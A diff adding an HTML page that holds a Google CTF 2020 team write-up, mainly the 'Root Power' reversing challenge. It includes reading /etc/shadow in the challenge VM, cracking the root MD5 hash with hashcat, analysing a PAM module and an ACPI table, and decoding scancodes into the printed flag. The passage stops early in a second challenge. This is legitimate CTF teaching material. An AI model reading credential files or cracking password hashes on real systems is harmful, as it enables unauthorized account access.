@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>Google CTF 2020</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/gctf-2020/#root-power">Root Power</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/gctf-2020/#initial-review">Initial review</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/gctf-2020/#ghidra-review-of-kernel-and-pam-modules">Ghidra review of kernel and PAM modules</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/gctf-2020/#initramfs-exploration">initramfs exploration</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/gctf-2020/#keyboard-decoding">Keyboard decoding</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/gctf-2020/#tracing">tracing</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/gctf-2020/#initial-review-1">initial review</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/gctf-2020/#attack-overview">attack overview</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/gctf-2020/#beginner">beginner</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/gctf-2020/#initial-review-2">initial review</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/gctf-2020/#solution">solution</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>Google CTF 2020</h1>
+    </header>
+
+    <div class="content">
+        <p>Google CTF was put on by (as you might expect) Google in August 2020.  I competed with the Texas A&amp;M Cybersecurity club and have included writeups for the challenges I helped solve below.</p>
+<span id="continue-reading"></span><h1 id="root-power">Root Power</h1>
+<p><a href="https://github.com/tamucybersec/gctf-2020/tree/master/reversing/root-power">source</a></p>
+<p><a href="https://storage.googleapis.com/gctf-2020-attachments-project/4905c5f476c7e7eac34bd15fbd2e61a6d6c724c8431056f57a61fb0a0a35bf4bbdcae058d9c3fc528ce306e97a42924878c36c4bc2c145548553744e630c6073">Attachment</a></p>
+<p>Root is an incredibly powerful account to access. Especially in this National Grid VM.</p>
+<h2 id="initial-review">Initial review</h2>
+<p><a href="https://github.com/VTCAKAVSMoACE">Addison</a>, <a href="https://github.com/tcheinen">theinen</a>, <a href="https://github.com/komputerwiz">komputerwiz</a>, <a href="https://github.com/alalith">Arjun</a></p>
+<p>The attachment provided in the CTF provides us with a "vm.tar.xz". Extracting reveals a disk image (disk.img) and a
+script which launches a QEMU VM using the disk image (run.sh).</p>
+<p>Let's take a look around that disk image.</p>
+<h3 id="mounting-the-image">Mounting the image</h3>
+<p><a href="https://github.com/tcheinen">theinen</a></p>
+<p>With a disk image provided to us and a task to log in as root, the obvious thing is to just mount the disk and look for
+interesting stuff.  If we can't log in as root we can still look for interesting files.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ fdisk -l disk.img
+</span><span>Disk disk.img: 1.5 GiB, 1610612736 bytes, 3145728 sectors
+</span><span>Units: sectors of 1 * 512 = 512 bytes
+</span><span>Sector size (logical/physical): 512 bytes / 512 bytes
+</span><span>I/O size (minimum/optimal): 512 bytes / 512 bytes
+</span><span>Disklabel type: dos
+</span><span>Disk identifier: 0x415c2e94
+</span><span>
+</span><span>Device     Boot Start     End Sectors  Size Id Type
+</span><span>disk.img1  *     2048 3145727 3143680  1.5G 83 Linux
+</span></code></pre>
+<p>The bootable partition starts at 2048 with block sizes of 512 so to mount it we need to start at 1048576.</p>
+<p><code>❯ sudo mount -o loop,offset=1048576 disk.img disk</code> will mount the partition at the "disk" folder in the same directory.</p>
+<h3 id="chroot-systemd-nspawn-ing-qemu-autologin">chroot, systemd-nspawn-ing,  QEMU + autologin</h3>
+<p><a href="https://github.com/VTCAKAVSMoACE">Addison</a></p>
+<p>Google provides us with a script to launch it with QEMU, but it needs a password we don't have! We recognised that we
+would need a root shell on the device, so to do so, we employed multiple tools.</p>
+<p><a href="https://wiki.archlinux.org/index.php/Chroot">chroot</a>, the obvious first choice, allows us to simply log into the target's mounted folder with just <code>chroot vm</code>.
+Unfortunately, this doesn't give us <a href="https://wiki.archlinux.org/index.php/Systemd">systemd</a> or other boot-based services, so it just won't do.</p>
+<p>The next step was using <a href="https://wiki.archlinux.org/index.php/Systemd-nspawn">systemd-nspawn</a> to start the program at the systemd level. The following commands were used (in
+different shells):</p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">$</span><span> sudo systemd-nspawn</span><span style="color:#ffcc66;"> --private-network -x --image</span><span> disk.img</span><span style="color:#ffcc66;"> -M</span><span> root-power /lib/systemd/systemd
+</span><span style="color:#ffd580;">$</span><span> sudo machinectl shell root@root-power
+</span></code></pre>
+<p>This gave us a root shell with root privileges, but ultimately we still didn't find that anything significant changed.</p>
+<p>Finally, to get root on the device in QEMU, we modified the systemd units using the <a href="https://wiki.archlinux.org/index.php/Getty#Automatic_login_to_virtual_console">standard override for getty</a>. This was the access level we used for the rest of the challenge and ended up with how we did all of our
+live investigation from here.</p>
+<h3 id="hiding-in-the-etc-shadow">Hiding in the /etc/shadow?</h3>
+<p><a href="https://github.com/komputerwiz">komputerwiz</a></p>
+<p>The first place anyone should think to go to get root access is the "shadow file" in <code>/etc/shadow</code>. This file contains
+the hashed password of all users in a linux system. In this case, we can get the hashed root password:</p>
+<pre data-lang="console" style="background-color:#212733;color:#ccc9c2;" class="language-console "><code class="language-console" data-lang="console"><span>[root@gctf-root-power ~]# head -1 /etc/shadow
+</span><span>root:$1$OesMIrMe$m3dh/8JZc6k/fz9SW2PrI.:18445::::::
+</span></code></pre>
+<p>Here is a dissection of that hash:</p>
+<ul>
+<li><code>$1</code> - MD5 algorithm (this should be easy to crack!)</li>
+<li><code>$OesMIrMe</code> - Salt</li>
+<li><code>$m3dh/8JZc6k/fz9SW2PRI.</code> - Hash</li>
+</ul>
+<p>If we put the hash line into <code>hash.txt</code>, <a href="https://hashcat.net/hashcat/">hashcat</a> makes quick work of this password against the <a href="https://wiki.skullsecurity.org/Passwords">rockyou</a> password
+list:</p>
+<pre data-lang="console" style="background-color:#212733;color:#ccc9c2;" class="language-console "><code class="language-console" data-lang="console"><span>sky@$ hashcat -a0 -m 500 hash.txt ~/Downloads/rockyou.txt -O 
+</span><span>
+</span><span>sky@$ hashcat -a0 -m 500 hash.txt ~/Downloads/rockyou.txt -O --show
+</span><span>$1$OesMIrMe$m3dh/8JZc6k/fz9SW2PrI.:no
+</span></code></pre>
+<p>Turns out the hashed password is simply <code>no</code>. A feeling this seemed a bit too easy is quickly justified:</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>NATIONAL POWER GRID CONTROL SERVER. ALL ACCOUNTS EXCEPT ROOT DISABLED. ADMINISTRATORS ONLY.
+</span><span>gctf-root-power login: root
+</span><span>Password: (&quot;no&quot;)
+</span><span>NATIONAL POWER GRID CONTROL SERVER. ALL ACCOUNTS EXCEPT ROOT DISABLED. ADMINISTRATORS ONLY.
+</span><span>gctf-root-power login:
+</span></code></pre>
+<p>So there is something more than just a password at play here...</p>
+<h3 id="pacman-tells-all">Pacman tells all</h3>
+<p><a href="https://github.com/komputerwiz">komputerwiz</a></p>
+<p>Once we have a login on the system, we can use the following script to query Arch's <code>pacman</code> package manager database
+for any files that are not owned by any packages:</p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="font-style:italic;color:#5c6773;">#!/bin/sh
+</span><span>
+</span><span>tmp</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">$</span><span>{TMPDIR</span><span style="color:#f29e74;">-</span><span style="color:#bae67e;">/tmp</span><span>}</span><span style="color:#bae67e;">/pacman-disowned-$</span><span>UID</span><span style="color:#bae67e;">-$</span><span style="font-style:italic;color:#5ccfe6;">$
+</span><span>db</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">$</span><span>tmp</span><span style="color:#bae67e;">/db
+</span><span>fs</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">$</span><span>tmp</span><span style="color:#bae67e;">/fs
+</span><span>
+</span><span style="color:#ffd580;">mkdir </span><span style="color:#bae67e;">&quot;$</span><span>tmp</span><span style="color:#bae67e;">&quot;
+</span><span style="color:#f28779;">trap  </span><span style="color:#bae67e;">&#39;rm -rf &quot;$tmp&quot;&#39;</span><span> EXIT
+</span><span>
+</span><span style="color:#ffd580;">pacman</span><span style="color:#ffcc66;"> -Qlq </span><span style="color:#f29e74;">| </span><span style="color:#ffd580;">sort</span><span style="color:#ffcc66;"> -u </span><span style="color:#f29e74;">&gt; </span><span style="color:#bae67e;">&quot;$</span><span>db</span><span style="color:#bae67e;">&quot;
+</span><span>
+</span><span style="color:#ffd580;">find</span><span> /bin /etc /lib /sbin /usr </span><span style="color:#ccc9c2cc;">\
+</span><span>    !</span><span style="color:#ffcc66;"> -name</span><span> lost+found </span><span style="color:#ccc9c2cc;">\
+</span><span>    </span><span style="color:#95e6cb;">\(</span><span style="color:#ffcc66;"> -type</span><span> d</span><span style="color:#ffcc66;"> -printf </span><span style="color:#bae67e;">&#39;%p/\n&#39;</span><span style="color:#ffcc66;"> -o -print </span><span style="color:#95e6cb;">\) </span><span style="color:#f29e74;">| </span><span style="color:#ffd580;">sort </span><span style="color:#f29e74;">&gt; </span><span style="color:#bae67e;">&quot;$</span><span>fs</span><span style="color:#bae67e;">&quot;
+</span><span>
+</span><span style="color:#ffd580;">comm</span><span style="color:#ffcc66;"> -23 </span><span style="color:#bae67e;">&quot;$</span><span>fs</span><span style="color:#bae67e;">&quot; &quot;$</span><span>db</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">|</span><span style="color:#ffd580;">less
+</span></code></pre>
+<p>(Credit to <a href="https://bbs.archlinux.org/viewtopic.php?pid=1102910#p1102910">graysky</a> on the Arch Forums)</p>
+<p>This effectively "diffs" the filesystem against what would otherwise be a vanilla Arch installation. This yielded many
+auto-generated / user-specified configuration files, SSL certificates, and some particularly interesting files in
+<code>/usr/</code> toward the end:</p>
+<pre data-lang="console" style="background-color:#212733;color:#ccc9c2;" class="language-console "><code class="language-console" data-lang="console"><span>[root@gctf-root-power ~]# ./find-extra-files.sh
+</span><span>/etc/.pwd.lock
+</span><span>/etc/.updated
+</span><span>/etc/adjtime
+</span><span>/etc/ca-certificates/extracted/ca-bundle.trust.crt
+</span><span>/etc/ca-certificates/extracted/cadir/
+</span><span>/etc/ca-certificates/extracted/cadir/00673b5b.0
+</span><span>...
+</span><span>/etc/systemd/user/sockets.target.wants/dirmngr.socket
+</span><span>/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
+</span><span>/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
+</span><span>/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
+</span><span>/etc/systemd/user/sockets.target.wants/gpg-agent.socket
+</span><span>/etc/systemd/user/sockets.target.wants/p11-kit-server.socket
+</span><span>/usr/lib/modules/5.6.14-arch1-1/kernel/drivers/char/chck.ko
+</span><span>/usr/lib/modules/5.6.14-arch1-1/kernel/drivers/hello.ko
+</span><span>/usr/lib/security/pam_chck.so
+</span><span>/usr/lib/udev/hwdb.bin
+</span><span>[root@gctf-root-power ~]#
+</span></code></pre>
+<p>The <code>pam_check.so</code> module was indeed being used in <code>/etc/pam.d/system-auth</code>, which is probably why our attempt to log in
+with the root password earlier would not work. Let's see what is inside the PAM module and those kernel modules.</p>
+<h2 id="ghidra-review-of-kernel-and-pam-modules">Ghidra review of kernel and PAM modules</h2>
+<p><a href="https://github.com/VTCAKAVSMoACE">Addison</a>, <a href="https://github.com/tcheinen">theinen</a>, <a href="https://github.com/alalith">Arjun</a></p>
+<h3 id="hello-ko"><a href="https://github.com/tamucybersec/gctf-2020/blob/master/reversing/root-power/files/hello.ko">hello.ko</a></h3>
+<p><a href="https://github.com/tcheinen">theinen</a></p>
+<p><img src="https://raw.githubusercontent.com/tamucybersec/gctf-2020/master/reversing/root-power/images/hello_ko_hello_init.png" alt="init function, prints out Hello World to kernel log" />
+<img src="https://raw.githubusercontent.com/tamucybersec/gctf-2020/master/reversing/root-power/images/hello_ko_hello_exit.png" alt="init function, prints out Goodbye World to kernel log" />
+<img src="https://raw.githubusercontent.com/tamucybersec/gctf-2020/master/reversing/root-power/images/hello_ko_strings.png" alt="strings in memory, shows Hello World! and Goodbye World!" /></p>
+<p>This was a fairly trivial kernel module. It printed "Hello World" and "Goodbye World" to the kernel log. To the best of
+my knowledge it had nothing to do with the actual challenge but it was an extra file on the disk so we analyzed it.</p>
+<h3 id="chck-ko"><a href="https://github.com/tamucybersec/gctf-2020/blob/master/reversing/root-power/files/chck.ko">chck.ko</a></h3>
+<p><a href="https://github.com/VTCAKAVSMoACE">Addison</a>, <a href="https://github.com/tcheinen">theinen</a>, <a href="https://github.com/alalith">Arjun</a></p>
+<p>We run strings on the kernel module, and find that the author is someone working at Google. There is also a mention of
+acpi in the alias:</p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">arjun@broly:</span><span style="font-style:italic;color:#5ccfe6;">~</span><span style="color:#ffd580;">/Playground/google_ctf/reversing/root_power/vm$</span><span> strings chck.ko
+</span><span style="color:#ffd580;">Linux
+</span><span style="color:#ffd580;">eH3</span><span style="color:#f29e74;">&lt;</span><span>%(
+</span><span style="color:#ffd580;">]A</span><span style="color:#95e6cb;">\A</span><span style="color:#ffd580;">]
+</span><span style="color:#ffd580;">CHCK0001
+</span><span style="color:#ffd580;">chck
+</span><span>author</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">Connor </span><span style="color:#ffd580;">Wood </span><span style="color:#f29e74;">&lt;</span><span>venos@google.com</span><span style="color:#f29e74;">&gt;
+</span><span>license</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">GPL
+</span><span>srcversion</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">B36F4E186ADBA29CCB7A579
+</span><span>alias</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">acpi</span><span style="color:#f29e74;">*</span><span style="color:#bae67e;">:CHCK0001:</span><span style="color:#f29e74;">*
+</span><span>depends</span><span style="color:#f29e74;">=
+</span><span>retpoline</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">Y
+</span><span>name</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">chck
+</span><span style="color:#ffd580;">...
+</span></code></pre>
+<p>We look at the kernel modules in ghidra, and we see that the read function calls a function <code>acpi_evaluate_integer</code>.
+This function is external and invokes relies on uninitialised data which is likely to be defined in initramfs:</p>
+<p><img src="https://raw.githubusercontent.com/tamucybersec/gctf-2020/master/reversing/root-power/images/chck_read.png" alt="chck_read" /></p>
+<h3 id="pam-chck-so"><a href="https://github.com/tamucybersec/gctf-2020/blob/master/reversing/root-power/files/pam_chck.so">pam_chck.so</a></h3>
+<p><a href="https://github.com/tcheinen">theinen</a></p>
+<p><img src="https://raw.githubusercontent.com/tamucybersec/gctf-2020/master/reversing/root-power/images/pam_chck_so_functions.png" alt="pam_chck.so functions" /></p>
+<p>pam_chck.so has four functions, three of which are implementations of a pam interface.
+<a href="https://linux.die.net/man/3/pam_setcred">pam_setcred</a>,
+<a href="https://linux.die.net/man/3/pam_authenticate">pam_authenticate</a>, and
+<a href="https://linux.die.net/man/3/pam_acct_mgmt">pam_acct_mgmt</a>.  We know that the login prompt is seemingly ignoring the
+root password so pam_authenticate (which controls the login flow) seems like it'll be relevant.</p>
+<p><img src="https://raw.githubusercontent.com/tamucybersec/gctf-2020/master/reversing/root-power/images/pam_chck_so_authenticate.png" alt="pam_chck.so authenticate" /></p>
+<p>This explains the strange behavior we had noticed earlier with the login prompt. Any account which was not root would
+fail immediately by querying username again and root would fail with the correct password. It's worth noting that it
+doesn't read input for the password at all. The check_device function determines if we log in successfully or so, so the
+next place to look is that function.</p>
+<p><img src="https://raw.githubusercontent.com/tamucybersec/gctf-2020/master/reversing/root-power/images/pam_chck_so_check_device.png" alt="pam_chck.so check_device" /></p>
+<p>check_device reads two bytes from <code>/dev/chck</code>, converts them into an integer using atoi, and returns it. Looking back at
+pam_sm_authenticate, if <code>/dev/chck</code> returns a 1 then the login will succeed, otherwise it will fail.</p>
+<h2 id="initramfs-exploration">initramfs exploration</h2>
+<p><a href="https://github.com/VTCAKAVSMoACE">Addison</a>, <a href="https://github.com/komputerwiz">komputerwiz</a></p>
+<p>By this point, we had worked out that it was necessary to view the initramfs in order to access the data present in the
+kernel module (specifically, <code>chck_handle</code> and the call to <code>acpi_evaluate_integer</code>). So, we extracted the initramfs.</p>
+<h3 id="unpacking-and-peeking">Unpacking and peeking</h3>
+<p><a href="https://github.com/VTCAKAVSMoACE">Addison</a></p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">$</span><span> cp vm/boot/initramfs-linux.img .
+</span><span style="color:#ffd580;">$</span><span> cpio</span><span style="color:#ffcc66;"> -iv </span><span style="color:#f29e74;">&lt;</span><span> initramfs-linux.img 
+</span><span style="color:#ffd580;">kernel
+</span><span style="color:#ffd580;">kernel/firmware
+</span><span style="color:#ffd580;">kernel/firmware/acpi
+</span><span style="color:#ffd580;">kernel/firmware/acpi/ssdt.aml
+</span><span style="color:#ffd580;">3</span><span> blocks
+</span><span style="color:#ffd580;">$</span><span> cd kernel/firmware/acpi/
+</span><span style="color:#ffd580;">$</span><span> file ssdt.aml
+</span><span style="color:#ffd580;">ssdt.aml:</span><span> data
+</span></code></pre>
+<p>Hmm, that's unhelpful. A little google-fu shows us that this is an ACPI <a href="https://wiki.osdev.org/SSDT">Secondary System Description Table</a>,
+which is used for further providing functionality to devices with <a href="https://wiki.osdev.org/AML">ACPI Machine Language</a>. On the AML page, it
+specifically mentions:</p>
+<blockquote>
+<p>The Intel ASL assembler (iasl) is freely available on many Linux distributions and can convert in <strong>either direction</strong>
+between these formats.</p>
+</blockquote>
+<p>I run a variant of Ubuntu, so installing that was as easy as <code>sudo apt install acpica-tools</code>.</p>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">$</span><span> iasl</span><span style="color:#ffcc66;"> -d</span><span> ssdt.aml
+</span><span>
+</span><span style="color:#ffd580;">Intel</span><span> ACPI Component Architecture
+</span><span style="color:#ffd580;">ASL+</span><span> Optimizing Compiler/Disassembler version 20190509
+</span><span style="color:#ffd580;">Copyright</span><span> (c) </span><span style="color:#ffd580;">2000</span><span> - 2019 Intel Corporation
+</span><span>
+</span><span style="color:#ffd580;">File</span><span> appears to be binary: found 167 non-ASCII characters, disassembling
+</span><span style="color:#ffd580;">Binary</span><span> file appears to be a valid ACPI table, disassembling
+</span><span style="color:#ffd580;">Input</span><span> file ssdt.aml, Length 0x1FD (509) </span><span style="color:#ffd580;">bytes
+</span><span style="color:#ffd580;">ACPI:</span><span> SSDT 0x0000000000000000 0001FD (v02                 00000000 INTL 20190509)
+</span><span style="color:#ffd580;">Pass</span><span> 1 parse of </span><span style="color:#ffa759;">[</span><span>SSDT</span><span style="color:#ffa759;">]
+</span><span style="color:#ffd580;">Pass</span><span> 2 parse of </span><span style="color:#ffa759;">[</span><span>SSDT</span><span style="color:#ffa759;">]
+</span><span style="color:#ffd580;">Parsing</span><span> Deferred Opcodes (Methods/Buffers/Packages/Regions)
+</span><span>
+</span><span style="color:#ffd580;">Parsing</span><span> completed
+</span><span style="color:#ffd580;">Disassembly</span><span> completed
+</span><span style="color:#ffd580;">ASL</span><span> Output:    ssdt.dsl - 4182 bytes
+</span></code></pre>
+<p>Huzzah! Now we can mess around with the .dsl file, the full content of which is available
+<a href="https://github.com/tamucybersec/gctf-2020/tree/master/reversing/root-power/files/kernel/firmware/acpi">here</a>.</p>
+<h3 id="acpi-fun">ACPI fun</h3>
+<p><a href="https://github.com/VTCAKAVSMoACE">Addison</a></p>
+<p>Upon inspecting the DSL file, we find the method used in <a href="https://github.com/tamucybersec/gctf-2020/blob/master/reversing/root-power/files/chck.ko">chck.ko</a> via <code>acpi_evaluate_integer</code>. It's quite
+long, so I've redacted everything except the most important bit.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>Method (CHCK, 0, NotSerialized)
+</span><span>{
+</span><span>    ...
+</span><span>    KBDB [Local1] = Local0
+</span><span>    Local1 += One
+</span><span>    While ((Local0 != 0x9C))
+</span><span>    {
+</span><span>        WDTA ()
+</span><span>        Local0 = DTAR /* \CHCK.DTAR */
+</span><span>        If ((Local0 == 0x36))
+</span><span>        {
+</span><span>            Local0 = 0x2A
+</span><span>        }
+</span><span>
+</span><span>        If ((Local0 == 0xB6))
+</span><span>        {
+</span><span>            Local0 = 0xAA
+</span><span>        }
+</span><span>
+</span><span>        If ((Local1 &lt; 0x3E))
+</span><span>        {
+</span><span>            KBDB [Local1] = Local0
+</span><span>            Local1 += One
+</span><span>        }
+</span><span>    }
+</span><span>    EINT ()
+</span><span>    If ((KBDA == KBDB))
+</span><span>    {
+</span><span>        Return (One)
+</span><span>    }
+</span><span>    ...
+</span><span>}
+</span></code></pre>
+<p>KBDA and KBDB are buffers defined above:</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>Name (KBDA, Buffer (0x3E)
+</span><span>{
+</span><span>    /* 0000 */  0x2A, 0x2E, 0xAE, 0x14, 0x94, 0x21, 0xA1, 0x1A,  // *....!..
+</span><span>    /* 0008 */  0x9A, 0xAA, 0x1E, 0x9E, 0x2E, 0xAE, 0x19, 0x99,  // ........
+</span><span>    /* 0010 */  0x17, 0x97, 0x2A, 0x0C, 0x8C, 0xAA, 0x32, 0xB2,  // ..*...2.
+</span><span>    /* 0018 */  0x1E, 0x9E, 0x2E, 0xAE, 0x23, 0xA3, 0x17, 0x97,  // ....#...
+</span><span>    /* 0020 */  0x31, 0xB1, 0x12, 0x92, 0x2A, 0x0C, 0x8C, 0xAA,  // 1...*...
+</span><span>    /* 0028 */  0x26, 0xA6, 0x1E, 0x9E, 0x31, 0xB1, 0x22, 0xA2,  // &amp;...1.&quot;.
+</span><span>    /* 0030 */  0x16, 0x96, 0x1E, 0x9E, 0x22, 0xA2, 0x12, 0x92,  // ....&quot;...
+</span><span>    /* 0038 */  0x2A, 0x1B, 0x9B, 0xAA, 0x1C, 0x9C               // *.....
+</span><span>})
+</span><span>Name (KBDB, Buffer (0x3E){})
+</span></code></pre>
+<p>It was at this point that two things happen:</p>
+<ul>
+<li><a href="https://github.com/tcheinen">theinen</a> worked out that, when reading the device, it would only return values after hitting enter.</li>
+<li><a href="https://github.com/komputerwiz">komputerwiz</a> worked out that these are virtual keyboard events values.</li>
+</ul>
+<p>So now, we just need to decode the keyboard events into ASCII.</p>
+<h2 id="keyboard-decoding">Keyboard decoding</h2>
+<p><a href="https://github.com/VTCAKAVSMoACE">Addison</a>, <a href="https://github.com/tcheinen">theinen</a>, <a href="https://github.com/komputerwiz">komputerwiz</a>, <a href="https://github.com/alalith">Arjun</a></p>
+<p>When pressing -- or <em>releasing</em> -- a key on a keyboard (or pressing a button on the mouse), the kernel receives these
+events in the form of "key codes." The <a href="https://github.com/micmonay/keybd_event/blob/master/keybd_linux.go">keybd_event repo</a> by <a href="https://github.com/micmonay">@micmonay</a> contains a
+<a href="https://github.com/micmonay/keybd_event/blob/master/keybd_linux.go">mapping</a> that gives more meaningful names to the
+key codes. Decoding the key codes above gives the following sequence of keys:</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>VK_SHIFT
+</span><span>VK_C
+</span><span>VK_EXIT
+</span><span>VK_T
+</span><span>VK_PROG1
+</span><span>VK_F
+</span><span>VK_EJECTCD
+</span><span>VK_LEFTBRACE
+</span><span>VK_CYCLEWINDOWS
+</span><span>VK_ISO
+</span><span>VK_A
+</span><span>VK_BACK
+</span><span>VK_C
+</span><span>VK_EXIT
+</span><span>VK_P
+</span><span>NOT_FOUND
+</span><span>VK_I
+</span><span>VK_MSDOS
+</span><span>VK_SHIFT
+</span><span>VK_MINUS
+</span><span>VK_CALC
+</span><span>VK_ISO
+</span><span>VK_M
+</span><span>VK_SCROLLDOWN
+</span><span>VK_A
+</span><span>VK_BACK
+</span><span>VK_C
+</span><span>VK_EXIT
+</span><span>VK_H
+</span><span>VK_NEXTSONG
+</span><span>VK_I
+</span><span>VK_MSDOS
+</span><span>VK_N
+</span><span>VK_SCROLLUP
+</span><span>VK_E
+</span><span>VK_DELETEFILE
+</span><span>VK_SHIFT
+</span><span>VK_MINUS
+</span><span>VK_CALC
+</span><span>VK_ISO
+</span><span>VK_L
+</span><span>VK_STOPCD
+</span><span>VK_A
+</span><span>VK_BACK
+</span><span>VK_N
+</span><span>VK_SCROLLUP
+</span><span>VK_G
+</span><span>VK_EJECTCLOSECD
+</span><span>VK_U
+</span><span>VK_WWW
+</span><span>VK_A
+</span><span>VK_BACK
+</span><span>VK_G
+</span><span>VK_EJECTCLOSECD
+</span><span>VK_E
+</span><span>VK_DELETEFILE
+</span><span>VK_SHIFT
+</span><span>VK_RIGHTBRACE
+</span><span>VK_MAIL
+</span><span>VK_ISO
+</span><span>VK_ENTER
+</span><span>VK_BOOKMARKS
+</span></code></pre>
+<p>Wow, there is a lot of extra "junk" buttons being pressed. We can ignore the <code>MSDOS</code>, <code>CALC</code>, <code>NEXTSONG</code>, <code>EJECTCD</code>,
+etc. events. One pattern of note is the <code>SHIFT</code> event when the shift key is pressed down, and the corresponding <code>ISO</code>
+event when it is released. This means that the initial <code>C</code>, <code>T</code>, and <code>F</code> are capitalized, <code>LEFTBRACE</code> and <code>RIGHTBRACE</code>
+are actually curly braces ("{}"), and <code>MINUS</code> is actually an underscore ("_"). Putting all of this together yields the
+flag:</p>
+<p><code>CTF{acpi_machine_language}</code></p>
+<h1 id="tracing">tracing</h1>
+<p><em>pwn, easy</em></p>
+<p><a href="https://github.com/tamucybersec/gctf-2020/tree/master/pwn/tracing">source</a></p>
+<blockquote>
+<p>An early prototype of a contact tracing database is deployed for the developers to test, but is configured with some sensitive data. See if you can extract it.</p>
+</blockquote>
+<h2 id="initial-review-1">initial review</h2>
+<p>we are provided a rust source package.  A quick scan of the Cargo.toml shows that no dependencies have known vulnerabilities.</p>
+<pre data-lang="toml" style="background-color:#212733;color:#ccc9c2;" class="language-toml "><code class="language-toml" data-lang="toml"><span>[</span><span style="color:#73d0ff;">package</span><span>]
+</span><span style="color:#73d0ff;">name </span><span>= </span><span style="color:#bae67e;">&quot;pwn-tracing&quot;
+</span><span style="color:#73d0ff;">version </span><span>= </span><span style="color:#bae67e;">&quot;0.1.0&quot;
+</span><span style="color:#73d0ff;">authors </span><span>= [</span><span style="color:#bae67e;">&quot;Robin McCorkell &lt;rmccorkell@google.com&gt;&quot;</span><span>]
+</span><span style="color:#73d0ff;">edition </span><span>= </span><span style="color:#bae67e;">&quot;2018&quot;
+</span><span>
+</span><span>[</span><span style="color:#73d0ff;">dependencies</span><span>]
+</span><span style="color:#73d0ff;">log </span><span>= </span><span style="color:#bae67e;">&quot;0.4.8&quot;
